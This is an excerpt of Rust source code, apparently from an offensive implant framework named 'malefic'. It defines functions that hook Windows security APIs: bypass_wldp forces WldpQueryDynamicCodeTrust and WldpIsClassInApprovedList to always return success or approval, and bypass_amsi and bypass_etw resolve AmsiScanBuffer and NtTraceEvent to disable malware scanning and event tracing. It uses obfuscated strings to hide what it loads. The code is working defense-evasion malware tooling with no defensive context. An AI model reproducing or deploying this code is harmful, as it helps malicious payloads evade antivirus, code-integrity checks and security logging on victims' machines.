...
type AmsiScanBufferFn =
    unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u16, *mut c_void, *mut u32) -> i32;
type NtTraceEvent = unsafe extern "system" fn(Handle: *mut c_void, Event: *mut c_void) -> i32;
...
pub unsafe fn bypass_wldp() {
    if !WLDP_BYPASS_BE_INITED {
        let wldp_module =
            m_load_library_a(malefic_gateway::obfstr::obfstr!("wldp.dll\x00").as_ptr());
        if wldp_module.is_null() {
            return;
        }
        let wldp_query_dynamic_code_trust = m_get_proc_address(
            wldp_module,
            malefic_gateway::obfstr::obfstr!("WldpQueryDynamicCodeTrust\x00").as_ptr(),
        );
        ...
        let _ = WldpQueryDynamicCodeTrustDetour.initialize(
            original_wldp_query_dynamic_code_trust,
            |_, _, _| {
                return 0;
            },
        );
        let wldp_is_class_in_approved_list = m_get_proc_address(
            wldp_module,
            malefic_gateway::obfstr::obfstr!("WldpIsClassInApprovedList\x00").as_ptr(),
        );
        ...
        let _ = WldpIsClassInApprovedListDetour.initialize(
            original_wldp_is_class_in_approved_list,
            |_, _, is_approved, _| {
                *is_approved = 1;
                return 0;
            },
...
pub unsafe fn bypass_amsi() {
    if !AMSI_BYPASS_BE_INITED {
        let amsi_module =
            m_load_library_a(malefic_gateway::obfstr::obfstr!("amsi.dll\x00").as_ptr());
        if amsi_module.is_null() {
            return;
        }
        let amsi_scan_buffer = m_get_proc_address(
            amsi_module,
            malefic_gateway::obfstr::obfstr!("AmsiScanBuffer\x00").as_ptr(),
        );
        if amsi_scan_buffer.is_null() {
            return;
        }
        let original_amsi: AmsiScanBufferFn = std::mem::transmute(amsi_scan_buffer);
...
pub unsafe fn bypass_etw() {
    if !ETW_BYPASS_BE_INITED {
        let etw_module =
            m_load_library_a(malefic_gateway::obfstr::obfstr!("ntdll.dll\x00").as_ptr());
        if etw_module.is_null() {
            return;
        }
        let nt_trace_event = m_get_proc_address(
            etw_module,
            malefic_gateway::obfstr::obfstr!("NtTraceEvent\x00").as_ptr(),
        );
